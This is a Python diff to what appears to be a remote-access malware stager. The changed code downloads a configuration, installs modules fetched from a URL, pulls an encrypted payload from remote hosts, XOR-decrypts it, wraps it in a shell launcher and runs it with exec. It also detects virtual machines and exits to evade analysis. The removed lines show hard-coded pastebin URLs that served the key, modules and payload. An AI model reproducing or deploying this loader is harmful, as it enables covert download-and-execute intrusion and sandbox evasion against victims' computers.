@@ -51,7 +51,7 @@ def decrypt(data, key):
     except Exception as e:
         debug(e)
 
-def dependencies(source):
+def install(source):
     try:
         config   = json.loads(urllib.urlopen(str(source)).read())
         pip_exe  = os.popen('where pip' if os.name is 'nt' else 'which pip').read().rstrip()
@@ -87,34 +87,27 @@ def main(*args, **kwargs):
         api_key = ''
         payload = ''
         if 'config' in kwargs:
-            kwargs = json.loads(kwargs.get('config')) if not isinstance(kwargs.get('config'), dict) else kwargs.get('config')
-            if 'xor_key' in kwargs:
-                xor_key = decrypt(urllib.urlopen(kwargs.get('xor_key')).read(), base64.b64decode('uuYGm6cUAIwup6kWybUOZw=='))
-            if 'api_key' in kwargs:
-                api_key = decrypt(urllib.urlopen(kwargs.get('api_key')).read(), xor_key).splitlines()
-            if 'payload' in kwargs:
-                payload = decrypt(urllib.urlopen(config.get('payload')).read(), xor_key) 
+            config = kwargs.get('config')
             if isinstance(config, dict):
+                if 'modules' in config:
+                    install(config.get('modules'))
+                if 'xor_key' in config:
+                    xor_key = decrypt(urllib.urlopen(config.get('xor_key')).read(), base64.b64decode('$KEY$'))
+                if 'payload' in config:
+                    payload = decrypt(urllib.urlopen(config.get('payload')).read(), xor_key)
+                    if 'api_key' in config:
+                        payload = "\n".join([payload, "\nif __name__ == '__main__':", "    shell = Shell()", "    shell.run(config='{}')".format(config.get('api_key'))])
                 if __RELOAD:
                     debug("Finished installing missing dependencies.\nRestarting...")
                     os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
-                elif config.get('antiforensics'):
+                if config.get('antiforensics'):
                     if antiforensics():
                         debug("Virtual machine detected.")
-                else:
-                    if payload:
-                        exec payload in globals()
-                    else:
-                        debug("missing client payload")
+                        sys.exit(0)
+                if payload:
+                    exec payload in globals()
             else:
                 debug("Invalid data type for 'config' (expected '{}', got '{}')".format(dict, type(config)))
         else:
             debug("Missing argument 'config'")
 
-if __name__ == '__main__':
-    m = main(**{
-  "xor_key": "https://pastebin.com/raw/ejTRz0fT",
-  "api_key": "https://pastebin.com/raw/QPAJs08x",
-  "modules": "https://pastebin.com/raw/Z5z5cjny",
-  "payload": "https://pastebin.com/raw/BKRaUCBv"
-})
